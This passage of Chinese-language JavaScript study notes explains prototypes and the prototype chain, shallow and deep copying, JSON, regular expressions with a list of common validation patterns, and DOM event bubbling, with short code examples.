  	 console.log(mc.hasOwnPrototype("age"));
  	
  	结果返回：true
  	
  	console.log(mc.hasOwnPrototype("hasOwnProperty"));
  	
  	 结果返回：false

**⑶原型对象也是对象，所以它也有原型**

   当我们使用一个对象的属性或方法时，会先在自身中寻找

   自身中如果有，则直接使用

   如果没有则去原型对象中寻找，如果原型对象中有，则使用

   如果没有则去原型的原型中寻找，直到找到Object对象的原型

   Object对象的原型是没有原型的。

   如果在Object中依然没有找到，则返回undefined

**(3）显式原型与隐式原型**

　　1）每个函数function都有一个prototype,即显式原型（属性）

　　2}每个实例对象都有一个proto，可称为隐式原型（属性）

　　3）对象的隐式原型的值为其对应构造函数的显示原型的值

　　4）总结：

　　　　函数的prototype属性：在定义函数之前自动添加的，默认值是一个空Object对象

　　　　实例对象的proto属性：创建对象时自动添加的，默认值为构造函数的prototype属性值

　　程序员能直接操作显式原型，但不能直接操作隐式原型（ES6之前）

 **原型链**

​		图例：

​		

###### （三）原型链

　　**1）访问一个对象的属性时，**

　　　　先在自身属性查找，找到返回

　　　　如果没有，再沿着proto这条链上查找，找到返回

　　　　如果最终没找到，返回undefinded**

​		`实例.constructor === 构造函数`

**<img src="https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200915130429181-177209062.png" alt="img" style="zoom: 67%;" />**

 

 　<img src="https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200915130453584-380716796.png" alt="img" style="zoom:67%;" />

 

 

函数/原型/实体对象的关系（图解）**

　　　　**<img src="https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200915125627899-1269807046.png" alt="img" style="zoom:67%;" />**

 

 ![image-20201226214554980](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306004858.png)

##### 深浅拷贝

**1.深拷贝与浅拷贝的区别**

> 如何区分深拷贝与浅拷贝，简单点来说，就是假设B复制了A，当修改A时，看B是否会发生变化，如果B也跟着变了，说明这是浅拷贝，拿人手短，如果B没变，那就是深拷贝，自食其力。

**2.栈堆、基本数据类型、引用数据类型**
栈堆：存放数据的地方
基本数据类型：number,string,boolean,null,undefined.
引用数据类型(Object类)有常规名值对的无序对象{a:1}，数组[1,2,3]，以及函数等。

**3.浅拷贝**

```js
     let a= [0,1,2,3,4],b=a;
     console.log(a===b);
     a[0] = 1
     console.log(a,b)
     1234
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS8zNDIvMjgyLzM0MjI4MjcyOTgtNWI5ZjQzOTg4ZWUyOF9hcnRpY2xleA?x-oss-process=image/format,png)

**3.深拷贝**（典型方法）

```js
     function deepClone(obj){
       let objClone = Array.isArray(obj)?[]:{};
       if(obj && typeof obj==="object"){
         for(key in obj){
              //判断ojb子元素是否为对象，如果是，递归复制
               if(obj[key]&&typeof obj[key] ==="object"){
                   objClone[key] = deepClone(obj[key]);
               }else{
                   //如果不是，简单复制
                   objClone[key] = obj[key];
               }
            }
       }
       return objClone;
     } 

     let a=[1,2,3,4],b=deepClone(a);
     a[0]=2;
     console.log(a,b);
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS85NjkvMDAwLzk2OTAwMDQyMS01YjlmNDQ3NmIxZjY2X2FydGljbGV4?x-oss-process=image/format,png)
**4.引用类型和基本类型栈内存储**

**4.1基本类型**

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS80MDYvMjY0LzQwNjI2NDU5MTYtNWI5ZjQ1M2QzODA2ZF9hcnRpY2xleA?x-oss-process=image/format,png)

**4.2引用类型**

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS8xMDgvNjE0LzEwODYxNDAyNzctNWI5ZjQ1ODI1N2YwNV9hcnRpY2xleA?x-oss-process=image/format,png)

**5.JS中拷贝Array的slice和concat方法**

5.1.slice拷贝

```js
var a = [1,2,3];
var b = a.slice(); //slice
console.log(b === a);
a[0] = 4;
console.log(a);
console.log(b);
123456
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS8xMTYvODEyLzExNjgxMjg3OTItNWI5ZjQ3MTRhZTU1NV9hcnRpY2xleA?x-oss-process=image/format,png)
5.2.concat拷贝

```js
var a = [1,2,3];
var b = a.concat();  //concat
console.log(b === a);
a[0] = 4;
console.log(a);
console.log(b);
123456
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS8xMDAvNTM2LzEwMDUzNjQwNDEtNWI5ZjQ3NWRkMGU0OF9hcnRpY2xleA?x-oss-process=image/format,png)
看到结果，如果你觉得，这两个方法是深拷贝，那就恭喜你跳进了坑里！
来看看有意思的例子吧

```js
var a = [[1,2,3],4,5];
var b = a.slice();
console.log(a === b);
a[0][0] = 6;
console.log(a);
console.log(b);
123456
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS84NTMvOTU3Lzg1Mzk1NzY1LTViOWY0N2IzOTM1OTdfYXJ0aWNsZXg?x-oss-process=image/format,png)
可以看到`slice和contact对于第一层是深拷贝，但对于多层的时候，是复制的引用，所以是浅拷贝`,也叫`首层浅拷贝`

首层浅拷贝有:concat(),slice(),Object.assign()

**6.JSON 对象的 parse 和 stringify都是深拷贝**（这个方法推荐使用，简单方便)

```js
var obj = {name:'cancan',age:23,company : { name : '阿里', address : '杭州'} };
var obj_json = JSON.parse(JSON.stringify(obj));
console.log(obj === obj_json);
obj.company.name = "cancan82";
obj.name = "haha";
console.log(obj);
console.log(obj_json);
```

![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS1zdGF0aWMuc2VnbWVudGZhdWx0LmNvbS8yODkvOTA1LzI4OTkwNTU2NjEtNWI5ZjQ5MjFlMmMzM19hcnRpY2xleA?x-oss-process=image/format,png)

`但是,这种方法只能适用于一些简单的情况.比如下面这样的一个对象就不应用:`

```
const originObj = {
 name:'axuebin',
 sayHello:function(){
 console.log('Hello World');
 }
}
console.log(originObj); // {name: "axuebin", sayHello: ƒ}
const cloneObj = JSON.parse(JSON.stringify(originObj));
console.log(cloneObj); // {name: "axuebin"}
```

发现在` cloneObj `中，有属性丢失了。。。那是为什么呢？

在 MDN 上找到了原因：

> If undefined, a function, or a symbol is encountered during conversion it is either omitted (when it is found in an object) or censored to null (when it is found in an array). JSON.stringify can also just return undefined when passing in "pure" values like JSON.stringify(function(){}) or JSON.stringify(undefined).

`undefined`、`function`、`symbol `会在转换过程中被忽略。。。

明白了吧，就是说如果对象中含有一个函数时（很常见），就不能用这个方法进行深拷贝。

**递归的方法**

递归的思想就很简单了，就是对每一层的数据都实现一次 创建对象->对象赋值 的操作，简单粗暴上代码：

```
   function deepClone(source) {
   	//实例.constructor === 构造函数
      const targetObj = source.constructor === Array ? [] : {}; // 判断复制的目标是数组还是对象
      for (let keys in source) { // 遍历目标
        if (source.hasOwnProperty(keys)) {
          if (source[keys] && typeof source[keys] === 'object') { // 如果值是对象，就递归一下
            targetObj[keys] = source[keys].constructor === Array ? [] : {};
            targetObj[keys] = deepClone(source[keys]);
          } else { // 如果不是，就直接赋值
            targetObj[keys] = source[keys];
          }
        }
      }
      return targetObj;
    }
```



##### 对象处理



##### JSON

由于浏览器和服务器要经常传递数据，然后浏览器和服务器端所使用的语言不一定相同，

```
	var obj={"name":"孙悟空","age":18,"gender":"男"}//js对象
```

JS中的对象只有JS自己认识，其他语言不认识，所以对象不能以对象的方式直接传输

但是任何语言都能识别字符串，所以可以把JS对象转换成特殊字符串，然后在根据不同语言进行处理还原

```
	var obj='{"name":"孙悟空","age":18,"gender":"男"}'//js对象	
```

JSON分类：

​	1、对象{ }

​	2、数组[ ]

JSON中允许的值：

​	1、字符串

​	2、数值

​	3、布尔值

​	4、null

​	5、对象

​	6、数组

**JSON.parse()【从一个字符串中解析出json对象】**

例子：

//定义一个字符串

var data='{"name":"goatling"}'

//解析对象

JSON.parse(data)

结果是：

{name:"goatling"}

**JSON.stringify()【从一个对象中解析出字符串】**

var data={name:'goatling'}

JSON.stringify(data)

结果是：

'{"name":"goatling"}'

##### 正则表达式

> 正则表达式用于定义一些字符串的规则
>
> ​		计算机可以根据正则表达式来检查一个字符串是否符合规则
>
> ​		将字符串中符合规则的内容提取出来

正则表达式都能帮我们做什么？

​	1、数据隐藏（188****3456）

​	2、数据采集

​	3、数据过滤

​	4、数据验证（手机号，邮箱地址）

###### 创建正则表达式

**使用构造函数来创建正则表达式**

语法：

​	var 变量 = new RegExp("正则表达式",匹配模式");

​	使用typeof检查正则对象，会返回Object

​	在构造函数中可以传递一个`匹配模式`作为第二个参数

​			可以是：

​				i 忽略大小写

​				g 全局匹配模式

```
	//这个正则表达式可以来检查一个字符串中是否含有"a",并且忽略大小写
	var reg = new RegExp("a",'i')
	//这个正则表达式可以来检查一个字符串中是否含有"ab",并且忽略大小写
	var reg = new RegExp("ab",'i')
```

**使用字面量来创建正则表达式**

​		语法：var 变量 = /正则表达式/匹配模式

```
	var reg = new RegExp('a','i')
	var reg2 = /a/i; //等同于上面的创建方式
	console.log(reg2.test('a666'))  //true
```

`注：`

​	使用字面量的方式创建更加简单

​	使用构造函数创建更加灵活

###### 正则语法

​		1、**检查一个字符串是否含有“a"**

```
		//二者等价
		var reg = new RegExp('a') 
		var reg2 = /a/
```

​		2、**检查一个字符串中是否含有a或b**

```
		var reg = /a|b/    //使用 | 表示或者的意思
```

​		3、**检查一个字符串中是否含有字母**	

```
		var reg = /[ab]/   //[ ]里的内容也是或的关系，[ab] == a|b
		var reg2 = /[a-z]/  //[a-z] 任意小写字母
		var reg3 = /[A-Z]   //[A-Z] 任意大写字母
		var reg4 = /[A-z]/  //[A-z] 任意字母
		var reg5 = /[0-9]/  //[0-9] 任意数字
		console.log(reg.test("ae"))  //true
```

​		4、**检查一个字符串中是否含有abc或adc或aec**		

```
		var reg = /abc|adc|aec/
		var reg2 = /a[bde]c/   //二者等价
		console.log(reg2.test("aec"))  //true
		console.log(reg2.test("aeec"))  //false
```

​		5、**[^]除了**			

```
		var reg = /[^ab]/  //字符串除了"ab"都行
		var reg2 = /[^0-9]/  //字符串除了纯数字字符串
		console.log(reg.test("ab"))  //false
		console.log(reg.test("abc"))  //true
		console.log(reg2.test("abc"))  //true
		console.log(reg2.test("abc1"))  //false
```

​		6、**^检查一个字符串中是否以a开头**

​					^表示开头

```
		let reg = /^a/
		console.log(reg.test('fdsdfsfda')) //false
		console.log(reg.test('a45454sdhsadh'))  //true
```

​		7、**$ 检查一个字符串中是否以a结尾**

​					$表示结尾

```
		let reg = /a$/
		console.log(reg.test('fdsdfsfda')) //true
		console.log(reg.test('a45454sdhsadh'))  //false
		let reg2 = /^a$/
    		console.log(reg2.test('a')); //true
    		console.log(reg2.test('a4a')); //false
    		let reg = /^a|a$/   //a开头或者a结尾
    		console.log(reg.test('a322323'));  //true
```

​	8、**/^$/ 完全匹配正则表达式，而不是含有就行了**

```
		 let reg = /^a$/
           console.log(reg.test("a")) //true
           console.log(reg.test("aa")) //false
           let reg2 = /^aa$/
           console.log(reg2.test("a")) //false
           console.log(reg2.test("aa")) //true
           let reg3 = /^a123a$/
           console.log(reg3.test("a123a")); //true
```

​	9、**创建一个正则表达式，用来检查一个字符串是否是一个合法手机号**

​				手机号的规则（11位）：

​					1、以1开头

​					2、第二位3-9任意数字

​					3、第三位以后任意数字9个

​					^1  [3-9]  [0-9]{9}$

```
		var phoneStr = "17806707109"
         let reg = /^1[3-9][0-9]{9}$/  //如果以^开头$结尾，那么必须字段必须按规则严格匹配，不是含有就行了，{9}的意思是限定前面的[0-9]的数量
         console.log(reg.test(phoneStr)); //true
         console.log(reg.test(110));  //false
```

10、**检查一个字符串中是否含有 .**

​		. 表示任意字符

​		在正则表达式中使用\作为转义字符

​		\\.表示.

​		\\\\表示\

```
		var reg = /\./
		reg = /\\/
		console.log(reg.test("b.\\"))   //true
```

​		注意：使用构造函数时，由于它的参数是一个字符串，而\是字符串中的转义字符

​				 如果要使用\则需要使用\\\\来替代

11、**创建一个正则表达式检查一个字符串中是否含有单词child**		

```
	    let reg = /\bchild\b/
	    console.log(reg.test("hello child ren")) //true
	    console.log(reg.test("hello children")) //false
```

12、**去除掉字符串中前后的空格**

​				`去掉空格就是使用""来替换空格`

```
	    let str = prompt("请输入：")
         str = str.replace(/^\s*|\s*$/g,"")  
         console.log(str);
```

13、**检查邮件地址格式的正则表达式**

​		2249096563@qq.com

​		任意字母数字下划线  @  任意字母数字  .任意字母（2-5位）  任意字母（2-5位）

​		\w{3,}                     @  [A-z0-9]+      (\\.）[A-z]{2,5}){1,2}

```
	   let str = prompt("请输入：")
    	   var emailReg = /^\w{3,}@[A-z0-9]+(\.[A-z]{2,5}){1,2}$/
    	   console.log(emailReg.test(str));
```

 14、**排除含有lottery的行**

​		 //不含有he

​    	 let reg = /^((?!he).)*$/

​		正则：/^(http)(.(?!lottery))*(html)$/

​		效果：

​		<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215706.png" alt="image-20201229153839358" style="zoom:80%;" />

贪婪模式会尽可能匹配长

![image-20201229111303212](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215710.png)

非贪婪模式不会，在*或者+后面加一个？就会变成非贪婪模式了

![image-20201229111253017](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215715.png)

**量词**

​		-通过量词可以设置一个内容连续出现的次数

​		-量词只对它前面的一个内容起作用

​		-{n} 正好出现n次

​		-{m,n}出现m——n次

​		-{m,} 出现m次及以上

​       - + 至少一个，相当于{1，}

​		- * 0个或多个，相当于{0，}

​		- ？0个或1个，相当于{0，1}

```
          var reg = /a{3}/
          //ababab
          reg2 = /(ab){3}/
          reg3 = /ab{1,3}c/
          reg4 = /ab+c/
          reg5 = /ab*c/
          console.log(reg.test("aaabb"))  //true
          console.log(reg2.test("ababab"))  //true
          console.log(reg3.test("abc"))  //true
          console.log(reg3.test("abbbbc"))  //false
```

![image-20201228215248352](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215720.png)

###### 正则表达式的组匹配

**什么是分组**

通俗来说，我理解的分组就是在正则表达式中用（）包起来的内容代表了一个分组，像这样的：

```
     var reg = /(\d{2})/
     reg.test('12');  //true
```

这里reg中的(/d{2})就表示一个分组，匹配两位数字

**分组内容的的形式**

一个分组中可以像上面这样有一个具体的表达式，这样可以优雅地表达一个重复的字符串

```
     /hahaha/
     /(ha){3}/
```

这两个表达式是等效的，但有了分组之后可以更加简洁。

分组中还可以有多个候选表达式，例如

```
     var reg = /I come from (hunan|hubei|zhejiang)/;
     reg.test('I come from hunan');   //true
     reg.test('I come from hubei');   //true
```

也就是说在这个分组中，通过|隔开的几个候选表达式是并列的关系，所以可以把这个|理解为或的意思

**分组的分类**

分组有四种类型

- 捕获型 ()
- 非捕获型 (?:)
- 正向前瞻型 (?=)
- 反向前瞻型 (?!)
  我们使用的比较多的都是捕获型分组，只有这种分组才会暂存匹配到的串

**分组的应用**

分组在正则中还算使用的比较广泛的，我们常用的是捕获型分组

- 捕获与引用

  - 被正则表达式捕获(匹配)到的字符串会被暂存起来，其中，由分组捕获到的字符串会从1开始编号，于是我们可以引用这些字符串：

  ```
      var reg = /(\d{4})-(\d{2})-(\d{2})/;
      var dateStr = '2018-04-18';
      reg.test(dateStr);  //true
      console.log(RegExp.$1);  //2018
      console.log(RegExp.$2);   //04
      console.log(RegExp.$3);   //18
  ```

- 结合`replace方法`（match等方法也行）做字符串自定义替换

  - String.prototype.replace方法的传参中可以直接引用被捕获的串，比如我们想开发中常见的日期格式替换,例如后台给你返回了一个2018/04/18,让你用正则替换为2018-04-18，就可以利用分组

  ```
  var dateStr = '2018/04/18';
  var reg = /(\d{4})\/(\d{2})\/(\d{2})/;
  dateStr = dateStr.replace(reg, '$1-$2-$3') //"2018-04-18"
  ```

  不过这里需要注意的是/是需要用\转义的

  如果第二差数是以回调函数的形式的话，回调函数的第一个参数是`每次`匹配到的全部字符串

  ```
      function toCamelCase(str) {
              return str.replace(/-(.)/g, function (match, $1) {
                console.log(match,$1);    //-d d
                return $1.toUpperCase()
              })
            } 
          console.log(toCamelCase("abc-def-gh"));   //abcDefGh
  ```

- 反向引用

  - 正则表达式里也能进行引用，这称为反向引用：

  ```
       var reg = /(\w{3}) is \1/
       reg.test('kid is kid') // true
       reg.test('dik is dik') // true
       reg.test('kid is dik') // false
       reg.test('dik is kid') // false
  ```

  - 需要注意的是，如果引用了越界或者不存在的编号的话，就被被解析为普通的表达式

  ```
       var reg = /(\w{3}) is \6/;
       reg.test( 'kid is kid' ); // false
       reg.test( 'kid is \6' );  // true
  ```

- 非捕获型分组

  - 有的时候只是为了分组并不需要捕获的情况下就可以使用非捕获型分组，例如

  ```
       var reg = /(?:\d{4})-(\d{2})-(\d{2})/
       var date = '2012-12-21'
       reg.test(date)
       RegExp.$1 // 12
       RegExp.$2 // 21
  ```

- 正向与反向前瞻型分组

  - 正向前瞻型分组：你站在原地往前看，如果前方是指定的东西就返回true，否则为false

  ```
       var reg = /kid is a (?=doubi)/
       reg.test('kid is a doubi') // true
       reg.test('kid is a shabi') // false
  ```

  - 反向前瞻型分组：你站在原地往前看，如果前方不是指定的东西则返回true，如果是则返回false

  ```
       var reg = /kid is a (?!doubi)/
       reg.test('kid is a doubi') // false
       reg.test('kid is a shabi') // true
  ```

- 既然前瞻型分组和非捕获型分组都不会捕获，那他们有什么区别呢？先看例子：

```
     var reg, str = "kid is a doubi";
     reg = /(kid is a (?:doubi))/
     reg.test(str)
     RegExp.$1 // kid is a doubi

     reg = /(kid is a (?=doubi))/
     reg.test(str)
     RegExp.$1 // kis is a
```

也就是说非捕获型分组匹配到的字符串任然会被外层分组匹配到，而前瞻型不会，所以如果你希望在外层分组中不匹配里面分组的值的话就可以使用前瞻型分组了。

###### 正则表达式对象的方法

正则表达式的方法：

​		test()

​			-使用这个方法可以用来检查一个字符串是否符合正则表达式的规则，

​			 如果符合则返回true,否则返回false

```
		var reg = new RegExp("a",'i')
		console.log(reg.test("abcdjsk"))  //true
		console.log(reg.test("bcdjsk"))   //false	
```

​		exec()

​			-返回字符串中指定模式的字串，一次只能获取一个与之匹配的结果

```
		var reg = /[a-z]{3}/
		console.log(reg.exec("abcdjsk"))  //abc
		console.log(reg.exec("ab"))  //null
```



###### 支持正则表达式的String对象的方法

**search()**

​	**-可以搜索字符串中是否含有指定内容**

​	**-如果搜索到指定内容，则会返回第一次出现的索引，如果没有搜索到则返回 -1**

​	**-它可以接受一个正则表达式作为参数，然后会根据正则表达式去检索字符串，并返回检索到的字符下标**

​	**-search()只会查找第一个，即使设置全局匹配也没用**

```
	var str "hello abc hello aec"
	//搜索字符串中是否含有abc或aec或afc
	var result = str.search(/a[bef]c/)
	console.log(result)  //6
```

**match()**

​	**-可以根据正则表达式，从一个字符串中将符合条件的内容提取出来**

​	**-默认情况下我们的match方法只会找到第一个符合要求的内容，找到之后就停止检索了**

​			**我们可以设置正则表达式为全局匹配模式，这样就会匹配到所有的内容**

​			返回值以数组的形式返回

​			可以为一个正则表达式设置多个匹配模式，且顺序无所谓

​	-match()会将匹配到的内容封装到一个数组中返回，即时只查询到一个结果

```
	let str = "1a2b3cA"
	let result = str.match(/[a-z]/gi)  //全局匹配且忽略大小写
	console.log(result) //a,b,c,A
```

**replace()**

​	-可以将字符串中指定内容替换为新的内容

​	-参数：

​			1、被替换的内容,可以接收一个正则表达式作为参数

​			2、新的内容

返回值是改变后的数组

```
	let str = "78a898a98"
	let result = str.replace("a","@_@")
	console.log(result)  //78@_@898a98
	let result2 = str.replace(/a/g,"@_@")
	console.log(result2)  //78@_@898@_@98
	let result3 = str.replace(/a/g,"")
	console.log(result3)  //7889898
```

**split()**

​	**-可以将一个字符串拆分为一个数组**

​	**-方法中可以传递字符串或者一个正则表达式作为参数，如果参数是正则表达式，那么方法就会根据正则表达式来拆分字符串**

​	**-这个方法即使不指定全局匹配，也会全局拆分**

返回值是拆分后的数组

```
	var str = "1a2b3c4"
	//根据任意字母来将字符串进行拆分
	var result = str.split(/[A-z]/)
	console.log(result) //1,2,3,4
```

###### 常用的正常表达式

​	一、校验数字的表达式

1. 数字：^[0-9]*$

2. n位的数字：^\d{n}$

3. 至少n位的数字：^\d{n,}$

4. m-n位的数字：^\d{m,n}$

5. 零和非零开头的数字：^(0|[1-9][0-9]*)$

6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$

7. 带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$

8. 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$

9. 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$

10. 有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$

11. 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$

12. 非零的负整数：^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$

13. 非负整数：^\d+$ 或 ^[1-9]\d*|0$

14. 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$

15. 非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$

16. 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$

17. 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$

18. 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$

19. 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$



二、校验字符的表达式

1. 汉字：^[\u4e00-\u9fa5]{0,}$

2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$

3. 长度为3-20的所有字符：^.{3,20}$

4. 由26个英文字母组成的字符串：^[A-Za-z]+$

5. 由26个大写英文字母组成的字符串：^[A-Z]+$

6. 由26个小写英文字母组成的字符串：^[a-z]+$

7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$

8. 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$

9. 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$

10. 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$

11. 可以输入含有^%&',;=?$\"等字符：[^%&',;=?$\x22]+ 12 禁止输入含有~的字符：[^~\x22]+

 

 

三、特殊需求表达式

1. Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$

2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?

3. InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$

4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$

5. 电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$

6. 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7}

7. 身份证号(15位、18位数字)：^\d{15}|\d{18}$

8. 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$

9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$

10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$

11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$

12. 日期格式：^\d{4}-\d{1,2}-\d{1,2}

13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$

14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$

15. 钱的输入格式：

16. 1.有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：^[1-9][0-9]*$

17. 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$

18. 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$

19. 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$

20. 5.必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：^[0-9]+(.[0-9]{2})?$

21. 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$

22. 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$

23 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$

24. 备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里

25. xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$

26. 中文字符的正则表达式：[\u4e00-\u9fa5]

27. 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))

28. 空白行的正则表达式：\n\s*\r (可以用来删除空白行)

29. HTML标记的正则表达式：<(\S*?)[^>]*>.*?</\1>|<.*? /> (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)

30. 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)

31. 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)

32. 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)

33. IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用)

34. IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))

#### WebAPIs

##### 事件处理

###### 注册事件（绑定事件）

###### 删除事件（解绑事件）

###### DOM事件流

  ​	事件流描述的是从页面接受事件的顺序

  ​	事件发生时会在元素节点之间按照特定的顺序传播，这个传播过程即DOM事件流

​		1、JS代码只能执行捕获或者冒泡其中一个阶段。

​		2、onclick和`attachEvent( )（IE专属）`只能得到冒泡阶段

​		3、`如果addEventListener第三个参数是true，那么则处于捕获阶段 document -> html ->body ->father ->son`

​			 `如果addEventListener第三个参数是false(不写这个参数默认就是false),那么处于冒泡阶段 son ->father -body ->html ->document`

​		**事件冒泡**（事件默认触发冒泡）

​		IE的事件流叫做事件冒泡(event bubbling)，即事件开始时由最具体的元素(文档中嵌套层次最深的那个节点)接收，然后逐级向上传播到较为不具体的节点(文档)

​		怎么用理解呢？直接上代码：

```
     <!DOCTYPE html>
     <html lang="en">
       <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Document</title>
         <style>
           #box {
             width: 100px;
             height: 100px;
             background-color: red;
             margin: 0 auto;
           }
         </style>
       </head>
       <body>
         <div id="box"></div>
         <script>
         	//给box绑定事件
           document.getElementById('box').addEventListener('click', function () {
             alert('我是box盒子触发的')
           },false)
           //给Body绑定事件
           document.body.addEventListener('click', function () {
             alert('我是body触发的')
           },false)
         </script>
       </body>
     </html>

```

​	效果图：

​		![](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140811.png)

​	点击box,依次触发下面结果：

​		![image-20201012232917460](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140814.png)

​	![image-20201012232941969](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215730.png)

​	从上面例子可以看出：

​			当我点击了一下box盒子，实际上可以说是点击了body也行，因为整个页面都是body，所以你点哪里都可以说是点击了body,

​			那么问题来了，这两种说法都对，所以既会触发box盒子绑定的事件也会触发body绑定的事件。

​			但是，这两个事件触发的先后顺序可以规定好，box盒子，也就是子元素绑定的事件先执行，body，也就是父元素绑定的事件后执行

​	**事件捕获**

